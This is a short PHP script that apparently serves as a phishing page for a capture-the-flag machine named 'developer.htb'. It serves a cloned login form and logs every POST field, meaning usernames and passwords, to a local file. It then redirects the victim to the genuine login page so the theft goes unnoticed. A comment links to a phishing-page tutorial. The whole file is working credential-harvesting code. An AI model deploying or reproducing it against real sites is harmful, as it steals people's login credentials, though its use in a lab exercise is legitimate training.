<?php

// https://www.geeksforgeeks.org/how-to-create-a-facebook-phishing-page/
// https://stackoverflow.com/questions/359047/detecting-request-type-in-php-get-post-put-or-delete

$request = $_SERVER['REQUEST_URI'];

switch ($request) {
    case '/accounts/login/' :
        $method = $_SERVER['REQUEST_METHOD'];
        if ($method == 'POST'){
            header('Location: http://developer.htb/accounts/login/');
            $file = fopen("log.txt", "a");
 
            foreach($_POST as $variable => $value) {
                fwrite($file, $variable);
                fwrite($file, "=");
                fwrite($file, $value);
                fwrite($file, "\r\n");
            }
            
            fwrite($file, "\r\n");
            fclose($file);
            exit;
        } elseif ($method == 'GET'){
            require __DIR__ . '/login.html';
            break;
        }
    case '/writeup' :
        require __DIR__ . '/writeup.html';
        break;
    default:
        http_response_code(404);
        break;
}
?>